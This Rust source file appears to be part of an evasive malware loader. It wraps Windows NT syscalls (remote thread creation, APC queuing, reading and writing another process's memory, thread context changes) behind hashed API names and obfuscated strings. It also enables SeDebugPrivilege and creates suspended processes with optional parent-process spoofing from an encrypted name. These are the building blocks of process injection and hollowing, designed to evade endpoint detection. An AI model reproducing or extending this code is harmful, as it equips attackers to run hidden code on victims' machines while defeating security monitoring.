use crate::syscall;
use crate::ntapi::def::{THREAD_ALL_ACCESS, CURRENT_PROCESS};
use super::types::*;
use windows_sys::Win32::Security::*;
use core::ffi::c_void;

pub fn create_remote_thread_ex(process_handle: isize, start: usize, arg: usize) -> Result<isize, String> {
    use std::ffi::c_void;
    use obfstr::obfstr;

    let mut thread_handle: isize = 0;
    let nt_create_hash = crate::dbj2_hash!(b"NtCreateThreadEx");

    let status = syscall!(
        nt_create_hash,
        NtCreateThreadExFn,
        (&mut thread_handle as *mut isize as u64),
        THREAD_ALL_ACCESS as u64,
        core::ptr::null_mut::<c_void>() as u64,
        process_handle as u64,
        (start as *mut c_void) as u64,
        (arg as *mut c_void) as u64,
        0u32 as u64,
        0usize as u64,
        0usize as u64,
        0usize as u64,
        core::ptr::null_mut::<c_void>() as u64,
    );

    match status {
        Some(s) => {
            if s < 0 {
                return Err(format!("{}: {:#x}", obfstr!("NtCreateThreadEx failed"), s));
            }
        }
        None => {
            return Err(obfstr!("Syscall failed").to_string());
        }
    }

    Ok(thread_handle)
}

pub fn create_thread_ex(start: usize, arg: usize) -> Result<isize, String> {
    create_remote_thread_ex(CURRENT_PROCESS, start, arg)
}

pub fn wait_for_single_object(handle: isize) -> i32 {
    let nt_wait_hash = crate::dbj2_hash!(b"NtWaitForSingleObject");
    syscall!(nt_wait_hash, NtWaitForSingleObjectFn, handle as u64, 0u8 as u64, core::ptr::null_mut::<i64>() as u64).unwrap_or(-1)
}

pub fn close_handle(handle: isize) {
    let nt_close_hash = crate::dbj2_hash!(b"NtClose");
    let _ = syscall!(nt_close_hash, NtCloseFn, handle as u64);
}

pub fn queue_apc_thread(thread_handle: isize, routine: usize) -> Result<(), String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let nt_queue_hash = crate::dbj2_hash!(b"NtQueueApcThread");

    let qstatus = syscall!(
        nt_queue_hash,
        NtQueueApcThreadFn,
        thread_handle,
        routine as *mut c_void,
        core::ptr::null_mut::<c_void>(),
        core::ptr::null_mut::<c_void>(),
        core::ptr::null_mut::<c_void>(),
    )
    .ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if qstatus < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtQueueApcThread failed"), qstatus));
    }

    Ok(())
}

pub fn query_system_information(info_class: u32, buffer: *mut u8, size: u32, return_len: *mut u32) -> Result<i32, String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let nt_query_sys_hash = crate::dbj2_hash!(b"NtQuerySystemInformation");

    let status = syscall!(
        nt_query_sys_hash,
        NtQuerySystemInformationFn,
        info_class as u64,
        (buffer as *mut c_void) as u64,
        size as u64,
        return_len as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    Ok(status)
}

pub fn duplicate_object(
    source_process_handle: isize,
    source_handle: isize,
    target_process_handle: isize,
    target_handle: *mut isize,
    desired_access: u32,
    handle_attributes: u32,
    options: u32,
) -> Result<i32, String> {
    use obfstr::obfstr;

    let nt_dup_hash = crate::dbj2_hash!(b"NtDuplicateObject");

    let status = syscall!(
        nt_dup_hash,
        NtDuplicateObjectFn,
        source_process_handle as u64,
        source_handle as u64,
        target_process_handle as u64,
        target_handle as u64,
        desired_access as u64,
        handle_attributes as u64,
        options as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    Ok(status)
}

pub fn query_object(
    handle: isize,
    object_information_class: u32,
    object_information: *mut core::ffi::c_void,
    object_information_length: u32,
    return_length: *mut u32,
) -> Result<i32, String> {
    use obfstr::obfstr;

    let nt_query_obj_hash = crate::dbj2_hash!(b"NtQueryObject");

    let status = syscall!(
        nt_query_obj_hash,
        NtQueryObjectFn,
        handle as u64,
        object_information_class as u64,
        object_information as u64,
        object_information_length as u64,
        return_length as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    Ok(status)
}

pub fn set_io_completion(
    io_completion_handle: isize,
    key_context: *mut core::ffi::c_void,
    apc_context: *mut core::ffi::c_void,
    io_status: i32,
    io_status_information: usize,
) -> Result<i32, String> {
    use obfstr::obfstr;

    let nt_set_io_hash = crate::dbj2_hash!(b"NtSetIoCompletion");

    let status = syscall!(
        nt_set_io_hash,
        NtSetIoCompletionFn,
        io_completion_handle as u64,
        key_context as u64,
        apc_context as u64,
        io_status as u64,
        io_status_information as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    Ok(status)
}

pub fn test_alert() -> Result<(), String> {
    use obfstr::obfstr;

    let nt_test_alert_hash = crate::dbj2_hash!(b"NtTestAlert");

    let status = syscall!(
        nt_test_alert_hash,
        NtTestAlertFn,
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtTestAlert failed"), status));
    }
    Ok(())
}

pub fn get_context_thread(thread_handle: isize, context: *mut std::ffi::c_void) -> Result<(), String> {
    use obfstr::obfstr;

    let nt_get_context_hash = crate::dbj2_hash!(b"NtGetContextThread");

    let status = syscall!(
        nt_get_context_hash,
        NtGetContextThreadFn,
        thread_handle as u64,
        context as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtGetContextThread failed"), status));
    }
    Ok(())
}

pub fn set_context_thread(thread_handle: isize, context: *const std::ffi::c_void) -> Result<(), String> {
    use obfstr::obfstr;

    let nt_set_context_hash = crate::dbj2_hash!(b"NtSetContextThread");

    let status = syscall!(
        nt_set_context_hash,
        NtSetContextThreadFn,
        thread_handle as u64,
        context as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtSetContextThread failed"), status));
    }
    Ok(())
}

pub fn resume_thread(thread_handle: isize) -> Result<u32, String> {
    use obfstr::obfstr;

    let nt_resume_hash = crate::dbj2_hash!(b"NtResumeThread");
    let mut suspend_count = 0;

    let status = syscall!(
        nt_resume_hash,
        NtResumeThreadFn,
        thread_handle as u64,
        (&mut suspend_count as *mut u32 as u64)
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtResumeThread failed"), status));
    }
    Ok(suspend_count)
}

pub fn open_process(pid: u32, access: u32) -> Result<isize, String> {
    use obfstr::obfstr;
    use std::ffi::c_void;

    let mut handle: isize = 0;
    let mut client_id = ClientId {
        unique_process: pid as isize,
        unique_thread: 0,
    };
    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: core::ptr::null_mut(),
        attributes: 0,
        security_descriptor: core::ptr::null_mut(),
        security_quality_of_service: core::ptr::null_mut(),
    };

    let nt_open_hash = crate::dbj2_hash!(b"NtOpenProcess");

    let status = syscall!(
        nt_open_hash,
        NtOpenProcessFn,
        (&mut handle as *mut isize as u64),
        access as u64,
        (&mut oa as *mut ObjectAttributes as u64),
        (&mut client_id as *mut ClientId as u64)
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("NtOpenProcess failed: {:#x}", status));
    }

    Ok(handle)
}

pub fn read_virtual_memory(process_handle: isize, base_addr: usize, buffer: &mut [u8]) -> Result<usize, String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let mut bytes_read: usize = 0;
    let nt_read_hash = crate::dbj2_hash!(b"NtReadVirtualMemory");

    let status = syscall!(
        nt_read_hash,
        NtReadVirtualMemoryFn,
        process_handle as u64,
        (base_addr as *mut c_void) as u64,
        (buffer.as_mut_ptr() as *mut c_void) as u64,
        buffer.len() as u64,
        (&mut bytes_read as *mut usize as u64)
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("NtReadVirtualMemory failed: {:#x}", status));
    }

    Ok(bytes_read)
}

pub fn write_virtual_memory(process_handle: isize, base_addr: usize, buffer: &[u8]) -> Result<usize, String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let mut bytes_written: usize = 0;
    let nt_write_hash = crate::dbj2_hash!(b"NtWriteVirtualMemory");

    let status = syscall!(
        nt_write_hash,
        NtWriteVirtualMemoryFn,
        process_handle as u64,
        (base_addr as *mut c_void) as u64,
        (buffer.as_ptr() as *mut c_void) as u64,
        buffer.len() as u64,
        (&mut bytes_written as *mut usize as u64)
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if status < 0 {
        return Err(format!("NtWriteVirtualMemory failed: {:#x}", status));
    }

    Ok(bytes_written)
}

pub fn delay_execution_seconds(seconds: i64) -> Result<(), String> {
    use obfstr::obfstr;

    let nt_delay_hash = crate::dbj2_hash!(b"NtDelayExecution");
    let mut interval: i64 = -10_000_000 * seconds; // 100-ns units

    let dstatus = syscall!(
        nt_delay_hash,
        NtDelayExecutionFn,
        1u8 as u64,
        (&mut interval as *mut i64 as u64)
    )
    .ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    if dstatus < 0 {
        return Err(format!("NtDelayExecution failed: {:#x}", dstatus));
    }

    Ok(())
}

pub fn query_information_process(
    process_handle: isize,
    process_information_class: u32,
    process_information: *mut core::ffi::c_void,
    process_information_length: u32,
    return_length: *mut u32,
) -> Result<i32, String> {
    use core::ffi::c_void;
    use obfstr::obfstr;

    let nt_query_hash = crate::dbj2_hash!(b"NtQueryInformationProcess");

    let status = syscall!(
        nt_query_hash,
        NtQueryInformationProcessFn,
        process_handle as u64,
        process_information_class as u64,
        process_information as u64,
        process_information_length as u64,
        return_length as u64
    ).ok_or_else(|| obfstr!("Syscall failed").to_string())?;

    Ok(status)
}

pub fn normalize_nt_path(target: &str) -> Result<String, String> {
    use std::path::PathBuf;
    use std::env;

    let sys_root = env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
    let mut path = PathBuf::from(target.replace("/", "\\"));

    // 1. 核心兼容逻辑：如果是记事本，直接强制重定向到 C:\Windows\notepad.exe (Legacy PE)
    // 这能绕过 System32 下那个 0 字节的别名以及“序数找不到”的 UWP 错误
    let file_name = path.file_name().and_then(|s| s.to_str()).unwrap_or("");
    if file_name.eq_ignore_ascii_case("notepad.exe") {
        path = PathBuf::from(&sys_root).join("notepad.exe");
    } 
    // 2. 如果只是纯文件名（如 "calc.exe"），补全到 System32
    else if path.parent().map_or(true, |p| p.as_os_str().is_empty()) {
        path = PathBuf::from(&sys_root).join("System32").join(target);
    }

    // 3. 获取标准路径并直接转换
    let canonical = path.canonicalize()
        .map_err(|e| format!("Path not found: {} ({})", path.display(), e))?;
    let path_str = canonical.to_str().ok_or("Invalid UTF-8")?;

    // 4. 优先尝试获取原生设备路径 (\Device\...)
    if let Ok(kernel_path) = get_kernel_native_path(path_str) {
        return Ok(kernel_path);
    }

    // 5. 兜底方案：转换为 NT 符号链接路径 (\??\...)
    Ok(path_str.replace(r"\\?\", r"\??\"))
}

// 获取文件的内核设备路径，如 "\Device\HarddiskVolume2\Windows\notepad.exe"
pub fn get_kernel_native_path(path: &str) -> Result<String, String> {
    use std::fs::File;
    use std::os::windows::io::AsRawHandle;
    use windows_sys::Win32::Storage::FileSystem::{GetFinalPathNameByHandleW, FILE_NAME_NORMALIZED, VOLUME_NAME_NT};

    let file = File::open(path).map_err(|e| format!("Failed to open file: {}", e))?;
    let handle = file.as_raw_handle();

    let mut buffer: Vec<u16> = vec![0u16; 512];
    let res = unsafe { GetFinalPathNameByHandleW(handle as _, buffer.as_mut_ptr(), buffer.len() as u32, FILE_NAME_NORMALIZED | VOLUME_NAME_NT) };
    if res == 0 || res as usize > buffer.len() {
        return Err("GetFinalPathNameByHandleW failed".to_string());
    }

    let path_final = String::from_utf16(&buffer[..res as usize]).map_err(|e| e.to_string())?;

    // Normalize leading \\?\ prefix if present
    let final_path = if path_final.starts_with(r"\\?\") {
        path_final[4..].to_string()
    } else {
        path_final
    };

    Ok(final_path)
}

fn enable_debug_privilege() -> Result<(), String> {
    use windows_sys::Win32::Security::*;
    use std::ptr;

    let mut token_handle: isize = 0;
    let nt_open_token_hash = crate::dbj2_hash!(b"NtOpenProcessToken");
    let status_open = syscall!(
        nt_open_token_hash,
        NtOpenProcessTokenFn,
        -1isize, // NtCurrentProcess
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &mut token_handle as *mut isize
    ).ok_or("Syscall NtOpenProcessToken failed")?;
    if status_open < 0 {
        return Err(format!("NtOpenProcessToken failed: {:#x}", status_open));
    }

    // SeDebugPrivilege LUID is {20, 0}
    let mut tp: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.LowPart = 20;
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    let nt_adjust_hash = crate::dbj2_hash!(b"NtAdjustPrivilegesToken");
    let status_adjust = syscall!(
        nt_adjust_hash,
        NtAdjustPrivilegesTokenFn,
        token_handle,
        0u8, // DisableAllPrivileges = FALSE
        &mut tp as *mut TOKEN_PRIVILEGES as *mut c_void,
        std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
        ptr::null_mut::<c_void>(),
        ptr::null_mut::<u32>()
    ).ok_or("Syscall NtAdjustPrivilegesToken failed")?;
    if status_adjust < 0 {
        let _ = close_handle(token_handle);
        return Err(format!("NtAdjustPrivilegesToken failed: {:#x}", status_adjust));
    }

    let _ = close_handle(token_handle);
    Ok(())
}

pub fn create_process(target_exe: &str, parent_handle: Option<isize>, suspended: bool) -> Result<(isize, isize), String> {
    use obfstr::obfstr;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use core::ffi::c_void;
    use ntapi::ntpsapi::*;
    use ntapi::ntrtl::*;
    use ntapi::ntapi_base::*;
    use windows::Win32::Foundation::UNICODE_STRING;

    let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
    let ntdll_base = unsafe { crate::syscall::common::get_loaded_module_by_hash(ntdll_hash) }
        .ok_or_else(|| obfstr!("Failed to get ntdll.dll base").to_string())?;

    let nt_path_str = normalize_nt_path(target_exe)?;

    let nt_path_u16: Vec<u16> = OsStr::new(&nt_path_str).encode_wide().chain(std::iter::once(0)).collect();

    let mut image_path_unicode = UNICODE_STRING {
        Length: ((nt_path_u16.len() - 1) * 2) as u16,
        MaximumLength: (nt_path_u16.len() * 2) as u16,
        Buffer: windows::core::PWSTR(nt_path_u16.as_ptr() as *mut u16),
    };

    let rtl_create_params_hash = crate::dbj2_hash!(b"RtlCreateProcessParametersEx");
    let rtl_create_params_addr = unsafe { crate::syscall::common::pe::get_export_by_hash(ntdll_base, rtl_create_params_hash) };
    let rtl_create_params: unsafe extern "system" fn(*mut *mut c_void, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut c_void, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, u32) -> i32 = 
        unsafe { core::mem::transmute(rtl_create_params_addr.ok_or("RtlCreateProcessParametersEx not found")?) };

    // Create a distinct, quoted CommandLine UNICODE_STRING to avoid CommandLine alias/validation issues
    let cmd_path = nt_path_str.trim_start_matches(r"\??\");
    let cmd_line = format!("\"{}\"", cmd_path); // ensure quoted command line
    let cmd_u16: Vec<u16> = OsStr::new(&cmd_line).encode_wide().chain(std::iter::once(0)).collect();
    let mut command_line_unicode = UNICODE_STRING {
        Length: ((cmd_u16.len() - 1) * 2) as u16,
        MaximumLength: (cmd_u16.len() * 2) as u16,
        Buffer: windows::core::PWSTR(cmd_u16.as_ptr() as *mut u16),
    };

    let mut process_parameters: *mut c_void = std::ptr::null_mut();
    let params_status = unsafe {
        rtl_create_params(
            &mut process_parameters,
            &mut image_path_unicode, // ImagePathName
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut command_line_unicode, // CommandLine (use separate quoted buffer)
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x01 // RTL_USER_PROC_PARAMS_NORMALIZED
        )
    };
    if params_status < 0 { return Err(format!("RtlCreateProcessParametersEx: {:#x}", params_status)); }

    let mut attrs = Vec::new();
    
    let image_attr_ptr: *mut c_void = nt_path_u16.as_ptr() as *mut c_void;
    let image_attr_size: usize = image_path_unicode.Length as usize; // bytes



    attrs.push(PS_ATTRIBUTE {
        Attribute: PS_ATTRIBUTE_IMAGE_NAME as usize,
        Size: image_attr_size,
        u: PS_ATTRIBUTE_u { ValuePtr: image_attr_ptr },
        ReturnLength: std::ptr::null_mut(),
    });

    if let Some(h_parent) = parent_handle {
        attrs.push(PS_ATTRIBUTE {
            Attribute: PS_ATTRIBUTE_PARENT_PROCESS as usize,
            Size: std::mem::size_of::<usize>(),
            u: PS_ATTRIBUTE_u { ValuePtr: h_parent as *mut c_void },
            ReturnLength: std::ptr::null_mut(),
        });
    }

    let header_size = std::mem::size_of::<usize>(); // 8 on x64
    let total_attr_size = header_size + (attrs.len() * std::mem::size_of::<PS_ATTRIBUTE>());
    let mut attr_list_buffer = vec![0u8; total_attr_size];

    unsafe {
        let total_len_ptr = attr_list_buffer.as_mut_ptr() as *mut usize;
        *total_len_ptr = total_attr_size as usize;

        let attributes_ptr = attr_list_buffer.as_mut_ptr().add(header_size) as *mut PS_ATTRIBUTE;
        for (i, attr) in attrs.iter().enumerate() {
            std::ptr::write(attributes_ptr.add(i), *attr);
        }
    }

    let mut create_info: PS_CREATE_INFO = unsafe { std::mem::zeroed() };
    create_info.Size = std::mem::size_of::<PS_CREATE_INFO>();
    create_info.State = PsCreateInitialState;

    create_info.u.InitState.InitFlags = 0x00000003;

    let mut h_process: isize = 0;
    let mut h_thread: isize = 0;
    let thread_flags = if suspended { 0x1 } else { 0 }; // THREAD_CREATE_FLAGS_CREATE_SUSPENDED


    // Use default ProcessFlags (0). Some environments require InitFlags adjustment instead.
    let process_flags: u32 = 0u32;

    let status = syscall!(
        crate::dbj2_hash!(b"NtCreateUserProcess"),
        NtCreateUserProcessFn,
        &mut h_process as *mut isize,
        &mut h_thread as *mut isize,
        0x001F0FFF, // PROCESS_ALL_ACCESS
        0x001F0FFF, // THREAD_ALL_ACCESS
        core::ptr::null_mut::<c_void>(),
        core::ptr::null_mut::<c_void>(),
        process_flags, // ProcessFlags
        thread_flags,
        process_parameters,
        &mut create_info as *mut PS_CREATE_INFO,
        attr_list_buffer.as_mut_ptr() as *mut PS_ATTRIBUTE_LIST
    ).ok_or("Syscall failed")?;


    unsafe {
        if let Some(addr) = crate::syscall::common::pe::get_export_by_hash(ntdll_base, crate::dbj2_hash!(b"RtlDestroyProcessParameters")) {
            let destroy: unsafe extern "system" fn(*mut c_void) = core::mem::transmute(addr);
            destroy(process_parameters);
        }
    }

    if status < 0 { return Err(format!("NtCreateUserProcess failed: {:#x}", status)); }

    Ok((h_process, h_thread))
}

pub unsafe fn create_process_with_spoofing(target_program: &str, suspended: bool) -> Result<windows_sys::Win32::System::Threading::PROCESS_INFORMATION, String> {
    use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;
    use crate::utils::simple_decrypt;

    let _ = enable_debug_privilege();

    // Simplified: if compiled with ppid_spoofing, read the compile-time encrypted parent name and decrypt
    let parent_handle: Option<isize> = {
        #[cfg(feature = "ppid_spoofing")]
        {
            let parent_name = simple_decrypt(env!("RSL_ENCRYPTED_PARENT_PROCESS_NAME"));

            #[cfg(feature = "debug")]
            crate::utils::print_message(&format!("[DEBUG] Attempting to spoof parent process: {}", parent_name));

            let parent_hash = crate::utils::dbj2_hash(parent_name.to_lowercase().as_bytes());
            match crate::syscall::common::get_process_id_by_name(parent_hash) {
                Ok(parent_pid) => {
                    match crate::ntapi::open_process(parent_pid, 0x001F0FFF) {
                        Ok(h) => {
                            Some(h)
                        }
                        Err(e) => {
                            #[cfg(feature = "debug")]
                            crate::utils::print_error("Error", &format!("Failed to open parent process: {}", e));
                            // Try to enable SeDebugPrivilege and retry
                            #[cfg(feature = "debug")]
                            crate::utils::print_message("[+] Attempting to enable SeDebugPrivilege and retry opening parent process");
                            if let Ok(_) = enable_debug_privilege() {
                                match crate::ntapi::open_process(parent_pid, 0x001F0FFF) {
                                    Ok(h) => {
                                        #[cfg(feature = "debug")]
                                        crate::utils::print_message(&format!("[DEBUG] Retry succeeded, opened parent handle: {:#x}", h));
                                        Some(h)
                                    }
                                    Err(e2) => {
                                        #[cfg(feature = "debug")]
                                        crate::utils::print_error("Error", &format!("Retry failed to open parent process: {}", e2));
                                        None
                                    }
                                }
                            } else {
                                #[cfg(feature = "debug")]
                                crate::utils::print_message("[DEBUG] Failed to enable SeDebugPrivilege");
                                None
                            }
                        }
                    }
                }
                Err(e) => {
                    #[cfg(feature = "debug")]
                    crate::utils::print_message(&format!("[DEBUG] get_process_id_by_name failed: {}", e));
                    None
                }
            }
        }
        #[cfg(not(feature = "ppid_spoofing"))]
        {
            None
        }
    };

    let (process_handle, thread_handle) = create_process(target_program, parent_handle, suspended)?;

    if let Some(h) = parent_handle {
        crate::ntapi::close_handle(h);
    }

    let process_info = PROCESS_INFORMATION {
        hProcess: process_handle as windows_sys::Win32::Foundation::HANDLE,
        hThread: thread_handle as windows_sys::Win32::Foundation::HANDLE,
        dwProcessId: 0,
        dwThreadId: 0,
    };

    Ok(process_info)
}